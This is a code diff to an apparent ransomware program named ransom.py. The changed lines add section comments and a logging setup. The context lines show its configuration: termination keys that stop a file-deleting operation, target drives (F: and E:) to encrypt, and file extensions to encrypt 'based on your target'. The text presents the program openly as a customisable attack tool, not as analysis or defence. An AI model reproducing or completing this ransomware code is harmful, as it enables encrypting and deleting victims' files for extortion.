@@ -25,6 +25,8 @@ from tkinter import ttk
 from PIL import Image, ImageTk
 
 
+""" Part 1: Application functions """
+
 # Defining Function to load the current path of ransom.py and then join it to relative_path
 def resource_path(relative_path):
     # Get Directory name of the current python file
@@ -63,7 +65,7 @@ def load_machine_id():
 
 
 
-# Global constants
+""" Part 2: Define Global constants """
 TERMINATION_KEY = "bingo"  # Termination keys used to close app and cancel Deleting Operation
 # TERMINATION_KEY = "yakuza"
 SECONDARY_TERMINATION_KEY = "stop"
@@ -83,10 +85,13 @@ ICON_PATH = resource_path("img/app_icon.ico")
 LOGO_PATH = resource_path("img/logo.png")
 THANKS_PATH = resource_path("img/thank_you.png")
 
+
+""" Part 3: Define Encryption Configs as Global Constants """
+
 # Ensure the time Directory Exists at the Start & Encryption Configs
 ensure_time_dir_exist()
 
-# Encryption Configures, Drives can be customized choose
+# You can customize choose the drives you want to encrypt
 DRIVES_TO_ENCRYPT = ["F:", "E:"]
 
 # File Extension to be encrypted, File Extension's can be customized based on a yor target
@@ -105,6 +110,16 @@ MAX_ATTEMPTS = 10
 DELAY = 5
 
 
+"""  Part 4: Setup Logging to Log the Encryption/Decryption Process in the Log Console """
+logging.basicConfig(
+    filename="encryption_log.txt",
+    level=logging.INFO,
+    format="%(asctime)s:%(levelname)s:%(message)s",
+    filemode="w"
+)
 
-
-
+consoleHandler = logging.StreamHandler()
+consoleHandler.setLevel(logging.INFO)
+formatter = logging.Formatter("%(asctime)s:%(levelname)s:%(message)s")
+consoleHandler.setFormatter(formatter)
+logging.getLogger().addHandler(consoleHandler)
